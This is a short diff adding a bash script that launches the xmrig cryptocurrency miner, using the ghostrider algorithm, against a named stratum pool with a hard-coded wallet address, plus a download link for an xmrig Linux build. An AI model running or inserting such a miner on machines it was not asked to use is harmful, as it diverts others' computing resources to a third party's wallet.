@@ -1,0 +1,4 @@
+#!/bin/bash
+./xmrig -a ghostrider --url stratum+tcp://uswest.miningpools.pro:8560 -u ScqE4b2g2V9531YsEv3by33TGLweqkceHV.001 -p c=SKYT
+
+https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz
